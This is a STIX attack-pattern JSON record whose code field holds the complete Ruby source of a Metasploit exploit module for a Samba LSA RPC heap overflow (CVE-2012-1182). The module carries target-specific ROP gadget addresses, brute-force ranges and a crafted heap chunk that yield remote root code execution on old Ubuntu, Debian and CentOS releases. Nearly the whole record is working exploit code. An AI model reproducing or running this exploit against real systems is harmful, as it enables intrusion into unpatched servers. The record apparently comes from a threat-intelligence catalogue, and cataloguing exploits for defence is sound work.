{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c95ded35-865b-4c6d-a516-24476f3e2711",
    "created": "2024-08-14T16:57:01.477504Z",
    "modified": "2024-08-14T16:57:01.477509Z",
    "name": "Samba SetInformationPolicy AuditEventsInfo Heap Overflow",
    "description": " This module triggers a vulnerability in the LSA RPC service of the Samba daemon because of an error on the PIDL auto-generated code. Making a specially crafted call to SetInformationPolicy to set a PolicyAuditEventsInformation allows to trigger a heap overflow and finally execute arbitrary code with root privileges.  The module uses brute force to guess the stackpivot/rop chain or the system() address and redirect flow there in order to bypass NX. The start and stop addresses for brute forcing have been calculated empirically. On the other hand the module provides the StartBrute and StopBrute which allow the user to configure his own addresses. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/samba/setinfopolicy_heap.rb",
            "external_id": "setinfopolicy_heap.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-1182"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::SMB::Client\n  include Msf::Exploit::RopDb\n  include Msf::Exploit::Brute\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Samba SetInformationPolicy AuditEventsInfo Heap Overflow',\n      'Description'    => %q{\n          This module triggers a vulnerability in the LSA RPC service of the Samba daemon\n        because of an error on the PIDL auto-generated code. Making a specially crafted\n        call to SetInformationPolicy to set a PolicyAuditEventsInformation allows to\n        trigger a heap overflow and finally execute arbitrary code with root privileges.\n\n        The module uses brute force to guess the stackpivot/rop chain or the system()\n        address and redirect flow there in order to bypass NX. The start and stop addresses\n        for brute forcing have been calculated empirically. On the other hand the module\n        provides the StartBrute and StopBrute which allow the user to configure his own\n        addresses.\n      },\n      'Author'         =>\n        [\n          'Unknown', # Vulnerability discovery\n          'blasty', # Exploit\n          'mephos', # Metasploit module\n          'sinn3r', # Metasploit module\n          'juan vazquez' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2012-1182'],\n          ['OSVDB', '81303'],\n          ['BID', '52973'],\n          ['ZDI', '12-069']\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 600,\n        },\n      'Platform'      => %w{ linux unix },\n      # smbd process is killed soon after being exploited, need fork with meterpreter\n      'DefaultOptions' => { \"PrependSetreuid\" => true, \"PrependSetregid\" => true, \"PrependFork\" => true, \"AppendExit\" => true, \"WfsDelay\" => 5},\n      'Targets'        =>\n        [\n          ['2:3.5.11~dfsg-1ubuntu2 on Ubuntu Server 11.10',\n            {\n              'Arch' => ARCH_X86,\n              'Offset' => 0x11c0,\n              'Ropname' => 'Ubuntu 11.10 / 2:3.5.8~dfsg-1ubuntu2',\n              'Stackpivot' => 0x0004393c, # xchg eax, esp ; ret in /lib/i386-linux-gnu/libgcrypt.so.11.7.0\n              'Bruteforce' =>\n                {\n                  'Start' => { 'libgcrypt_base' => 0xb67f1000 },\n                  'Stop'  => { 'libgcrypt_base' => 0xb69ef000 },\n                  'Step'  => 0x1000\n                }\n            }\n          ],\n          ['2:3.5.8~dfsg-1ubuntu2 on Ubuntu Server 11.10',\n            {\n              'Arch' => ARCH_X86,\n              'Offset' => 0x11c0,\n              'Ropname' => 'Ubuntu 11.10 / 2:3.5.8~dfsg-1ubuntu2',\n              'Stackpivot' => 0x0004393c, # xchg eax, esp ; ret in /lib/i386-linux-gnu/libgcrypt.so.11.7.0\n              'Bruteforce' =>\n                {\n                  'Start' => { 'libgcrypt_base' => 0xb68d9000 },\n                  'Stop'  => { 'libgcrypt_base' => 0xb6ad7000 },\n                  'Step'  => 0x1000\n                }\n            }\n          ],\n          ['2:3.5.8~dfsg-1ubuntu2 on Ubuntu Server 11.04',\n            {\n              'Arch' => ARCH_X86,\n              'Offset' => 0x11c0,\n              'Ropname' => 'Ubuntu 11.04 / 2:3.5.8~dfsg-1ubuntu2',\n              # when stack pivoting, we control dword [esi] (field \"next\" in talloc chunk), ecx and [esp+4] point to shellcode\n              'Stackpivot' => 0x0006af03, # pop ecx ; jmp dword [esi]  in /lib/i386-linux-gnu/libgcrypt.so.11.6.0\n              # we jump on \"pop ecx, jmp dword [esi] to remove 4 bytes from the stack, then jump on pop esp.. gadget\n              # to effectively stack pivot\n              'Stackpivot_helper' => 0x00054e87, #pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret  ;\n              'Bruteforce' =>\n                {\n                  'Start' => { 'libgcrypt_base' => 0xb6973000 },\n                  'Stop'  => { 'libgcrypt_base' => 0xb6b71000 },\n                  'Step'  => 0x1000\n                }\n            }\n          ],\n          # default version when installing 11.04 is 3.5.8 , 3.5.4 was PROPOSED on CD months before release date\n          #['2:3.5.4~dfsg-1ubuntu8 on Ubuntu 11.04',\n          #\t{\n          #\t\t'Arch' => ARCH_CMD,\n          #\t\t'Offset' => 0x11c0,\n          #\t\t'Ropname' => 'Ubuntu 11.04 / 2:3.5.4~dfsg-1ubuntu8',\n          #\t\t'Stackpivot' => 0,\n          #\t\t'Bruteforce' =>\n          #\t\t{\n          #\t\t\t# The start should be 0x950 aligned, and then step 0x1000.\n          #\t\t\t'Start' => { 'Ret' => 0x00230950 },\n          #\t\t\t'Stop'  => { 'Ret' => 0x22a00950 },\n          #\t\t\t'Step'  => 0x1000\n          #\t\t}\n          #\t}\n          #],\n          ['2:3.5.4~dfsg-1ubuntu8 on Ubuntu Server 10.10',\n            {\n              'Arch' => ARCH_X86,\n              'Offset' => 0x11c0,\n              'Ropname' => 'Ubuntu 10.10 / 2:3.5.4~dfsg-1ubuntu8',\n              'Stackpivot' => 0x0003e4bc, #xchg eax, esp ; ret in libgcrypt.so.11.5.3\n              'Bruteforce' =>\n                {\n                  'Start' => { 'libgcrypt_base' => 0xb694f000 },\n                  'Stop'  => { 'libgcrypt_base' => 0xb6b4d000 },\n                  'Step'  => 0x1000\n                }\n            }\n          ],\n          ['2:3.5.6~dfsg-3squeeze6 on Debian Squeeze',\n            {\n              'Arch' => ARCH_X86,\n              'Offset' => 0x11c0,\n              'Ropname' => 'Debian Squeeze / 2:3.5.6~dfsg-3squeeze6',\n              'Stackpivot' => 0x0003e30c, #xchg eax, esp ; ret in libgcrypt.so.11.5.3\n              'Bruteforce' =>\n                {\n                  'Start' => { 'libgcrypt_base' => 0xb6962000 },\n                  'Stop'  => { 'libgcrypt_base' => 0xb6a61000 },\n                  'Step'  => 0x1000\n                }\n            }\n          ],\n          ['3.5.10-0.107.el5 on CentOS 5',\n            {\n              'Arch' => ARCH_X86,\n              'Offset' => 0x11c0,\n              'Ropname' => '3.5.10-0.107.el5 on CentOS 5',\n              'Stackpivot' => 0x0006ad7e, #xchg eax, esp ; xchg eax, ebx ; add eax, 0xCB313435 ; or ecx, eax ; ret in libgcrypt.so.11.5.2\n              'Bruteforce' =>\n                {\n                  'Start' => { 'libgcrypt_base' => 0x0037c000 },\n                  'Stop'  => { 'libgcrypt_base' => 0x09e73000 },\n                  'Step'  => 0x1000\n                }\n            }\n          ]\n\n        ],\n      'DisclosureDate' => '2012-04-10',\n      'DefaultTarget'  => 0\n      ))\n\n    register_options([\n      OptInt.new(\"StartBrute\", [ false, \"Start Address For Brute Forcing\" ]),\n      OptInt.new(\"StopBrute\", [ false, \"Stop Address For Brute Forcing\" ])\n    ])\n\n    deregister_options('SMB::ProtocolVersion')\n  end\n\n  def exploit\n    if target.bruteforce?\n      bf = target.bruteforce\n\n      if datastore['StartBrute'] and datastore['StartBrute'] > 0\n        bf.start_addresses['libgcrypt_base'] = datastore['StartBrute']\n      end\n\n      if datastore['StopBrute'] and datastore['StopBrute'] > 0\n        bf.stop_addresses['libgcrypt_base'] = datastore['StopBrute']\n      end\n\n      if bf.start_addresses['libgcrypt_base'] > bf.stop_addresses['libgcrypt_base']\n        raise ArgumentError, \"StartBrute should not be larger than StopBrute\"\n      end\n    end\n    super\n  end\n\n  def brute_exploit(target_addrs)\n    print_status(\"Trying to exploit Samba with address 0x%.8x...\" % target_addrs['libgcrypt_base'])\n    datastore['DCERPC::fake_bind_multi'] = false\n    datastore['DCERPC::max_frag_size'] = 4248\n    datastore['DCERPC::smb_pipeio'] = 'trans'\n    datastore['DCERPC::ReadTimeout'] = 3\n\n    pipe = \"lsarpc\"\n\n    vprint_status('Use Rex client (SMB1 only) since this module is not compatible with RubySMB client')\n    connect(versions: [1])\n    smb_login()\n\n    handle = dcerpc_handle('12345778-1234-abcd-ef00-0123456789ab', '0.0', 'ncacn_np', [\"\\\\#{pipe}\"])\n    dcerpc_bind(handle)\n    dcerpc.socket.mode = 'rw'\n    # revert for other exploits\n    datastore['DCERPC::smb_pipeio'] = 'rw'\n\n    cmd = \";;;;\" # padding\n    helper = 0\n    if target['Arch'] == ARCH_CMD\n      cmd << \"#{payload.encoded}\\x00\" # system argument\n      tmp = cmd * (816/cmd.length)\n      tmp << \"\\x00\"*(816-tmp.length)\n      ret_addr =  addr\n    elsif target['Arch'] == ARCH_X86\n      cmd << generate_rop_payload('samba', payload.encoded,{'target'=>target['Ropname'], 'base'=> target_addrs['libgcrypt_base'] })\n      tmp = cmd\n      tmp << \"\\x00\"*(816-tmp.length)\n      ret_addr = target_addrs['libgcrypt_base']+target['Stackpivot']\n      # will help in stack pivot when it's not eax pointing to shellcode\n      if target['Stackpivot_helper']\n        helper = target_addrs['libgcrypt_base']+target['Stackpivot_helper']\n      end\n    end\n\n    stub = \"X\" * 20\n\n    stub << NDR.short(2)     # level\n    stub << NDR.short(2)     # level 2\n    stub << NDR.long(1)      # auditing mode\n    stub << NDR.long(1)      # ptr\n    stub << NDR.long(100000) # r-> count\n    stub << NDR.long(20)     # array size\n    stub << NDR.long(0)\n    stub << NDR.long(100)\n    stub << rand_text_alpha(target['Offset'])\n    # Crafted talloc chunk\n    #stub << 'A' * 8                       # next, prev\n    stub << NDR.long(helper) + 'A'*4        # next, prev\n    stub << NDR.long(0) + NDR.long(0)     # parent, child\n    stub << NDR.long(0)                   # refs\n    #\t\tstub << NDR.long(target_addrs['Ret']) # destructor # will become EIP\n    stub << NDR.long(ret_addr) # destructor # will become EIP\n    stub << NDR.long(0)                   # name\n    stub << \"AAAA\"                        # size\n    stub << NDR.long(0xe8150c70)          # flags\n    stub << \"AAAABBBB\"\n    stub << tmp # pointer to tmp+4 in $esp\n    stub << rand_text(32632)\n    stub << rand_text(62000)\n\n    begin\n      call(dcerpc, 0x08, stub)\n    rescue Rex::Proto::DCERPC::Exceptions::NoResponse, Rex::Proto::SMB::Exceptions::NoReply, ::EOFError\n    rescue Rex::Proto::DCERPC::Exceptions::Fault\n      print_error('Server is most likely patched...')\n    rescue Timeout::Error\n      print_status(\"Timeout\")\n    rescue Rex::Proto::SMB::Exceptions::LoginError\n      print_status(\"Rex::Proto::SMB::Exceptions::LoginError\")\n    rescue => e\n      if e.to_s =~ /STATUS_PIPE_DISCONNECTED/\n        print_status('Server disconnected, this is expected')\n      end\n    end\n    handler()\n    disconnect()\n  end\n\n  def check\n    begin\n      vprint_status('Connect with SMB1 for the check method, since it needs native_lm info')\n      connect(versions: [1])\n      smb_login()\n      disconnect()\n\n      version = smb_peer_lm().scan(/Samba (\\d\\.\\d.\\d*)/).flatten[0]\n      minor   = version.scan(/\\.(\\d*)$/).flatten[0].to_i\n      vprint_status(\"Version found: #{version}\")\n\n      return Exploit::CheckCode::Appears if version =~ /^3\\.4/ and minor < 16\n      return Exploit::CheckCode::Appears if version =~ /^3\\.5/ and minor < 14\n      return Exploit::CheckCode::Appears if version =~ /^3\\.6/ and minor < 4\n\n      return Exploit::CheckCode::Safe\n\n    rescue ::Exception\n      return CheckCode::Unknown\n    end\n  end\n\n  # Perform a DCE/RPC Function Call\n  def call(dcerpc, function, data, do_recv = true)\n\n    frag_size = data.length\n    if dcerpc.options['frag_size']\n      frag_size = dcerpc.options['frag_size']\n    end\n    object_id = ''\n    if dcerpc.options['object_call']\n      object_id = dcerpc.handle.uuid[0]\n    end\n    if options['random_object_id']\n      object_id = Rex::Proto::DCERPC::UUID.uuid_unpack(Rex::Text.rand_text(16))\n    end\n\n    call_packets = make_request(function, data, frag_size, dcerpc.context, object_id)\n    call_packets.each { |packet|\n      write(dcerpc, packet)\n    }\n\n    return true if not do_recv\n\n    raw_response = ''\n\n    begin\n      raw_response = dcerpc.read()\n    rescue ::EOFError\n      raise Rex::Proto::DCERPC::Exceptions::NoResponse\n    end\n\n    if (raw_response == nil or raw_response.length == 0)\n      raise Rex::Proto::DCERPC::Exceptions::NoResponse\n    end\n\n\n    dcerpc.last_response = Rex::Proto::DCERPC::Response.new(raw_response)\n\n    if dcerpc.last_response.type == 3\n      e = Rex::Proto::DCERPC::Exceptions::Fault.new\n      e.fault = dcerpc.last_response.status\n      raise e\n    end\n\n    dcerpc.last_response.stub_data\n  end\n\n  # Used to create standard DCERPC REQUEST packet(s)\n  def make_request(opnum=0, data=\"\", size=data.length, ctx=0, object_id = '')\n\n    opnum = opnum.to_i\n    size = size.to_i\n    ctx   = ctx.to_i\n\n    chunks, frags = [], []\n    ptr = 0\n\n    # Break the request into fragments of 'size' bytes\n    while ptr < data.length\n      chunks.push( data[ ptr, size ] )\n      ptr += size\n    end\n\n    # Process requests with no stub data\n    if chunks.length == 0\n      frags.push( Rex::Proto::DCERPC::Packet.make_request_chunk(3, opnum, '', ctx, object_id) )\n      return frags\n    end\n\n    # Process requests with only one fragment\n    if chunks.length == 1\n      frags.push( Rex::Proto::DCERPC::Packet.make_request_chunk(3, opnum, chunks[0], ctx, object_id) )\n      return frags\n    end\n\n    # Create the first fragment of the request\n    frags.push( Rex::Proto::DCERPC::Packet.make_request_chunk(1, opnum, chunks.shift, ctx, object_id) )\n\n    # Create all of the middle fragments\n    while chunks.length != 1\n      frags.push( Rex::Proto::DCERPC::Packet.make_request_chunk(0, opnum, chunks.shift, ctx, object_id) )\n    end\n\n    # Create the last fragment of the request\n    frags.push( Rex::Proto::DCERPC::Packet.make_request_chunk(2, opnum, chunks.shift, ctx, object_id) )\n\n    return frags\n  end\n\n  # Write data to the underlying socket\n  def write(dcerpc, data)\n    dcerpc.socket.write(data)\n    data.length\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2012-04-10",
    "x_mitre_platforms": [
        "%w{ linux unix }"
    ]
}